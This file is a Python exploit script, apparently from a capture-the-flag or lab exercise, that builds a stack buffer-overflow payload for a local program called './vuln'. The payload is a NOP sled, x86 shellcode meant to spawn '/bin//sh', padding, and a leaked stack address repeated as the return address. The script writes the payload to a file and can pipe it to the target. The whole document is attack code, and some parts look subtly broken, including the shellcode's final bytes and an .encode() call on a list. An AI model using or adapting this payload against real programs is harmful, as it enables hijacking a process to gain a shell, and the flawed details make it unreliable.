import subprocess

def func(n):
    return int(n, base=16)

def main():
    
    cplexe = False


    if cplexe:
        prgm = subprocess.Popen("./vuln", stdin=subprocess.PIPE, stdout=subprocess.PIPE)
        a = prgm.stdout.readline()
        b = a.decode().split(' ')[0][:-1]
        print(b)
    else:
        b = input()

    #23 opcodes

    cmd_txt = ["90"]*64 + ["31", "c0", "50", "68", "2f", "2f", "73", "68", "68", "2f", "62", "69", "6e", "89", "e3", "53", "89", "e1", "b0", "0b", "cd", "0f", "05"] + ["41"]*45


    for i in range(len(b)-2,0, -2):
        cmd_txt += [b[i:i+2]]
    
    cmd_txt += ["41"]*2

    for i in range(len(b)-2,0, -2):
        cmd_txt += [b[i:i+2]]

    cmd_txt += ["00"]*2

    for i in range(len(b)-2,0, -2):
        cmd_txt += [b[i:i+2]]

    for i in cmd_txt:
        print("0x", i, sep = "", end=", ")

    print()
#    cmd_txt += ["42"]*2

    cmd = list(map(func, cmd_txt))

    print(cmd)
    
    f = open("input.txt", "wb")
    for i in cmd:
        f.write(bytes([i]))
    
    if cplexe:
        prgm.stdin.write(cmd_txt.encode())
        prgm.stdin.close()



main()
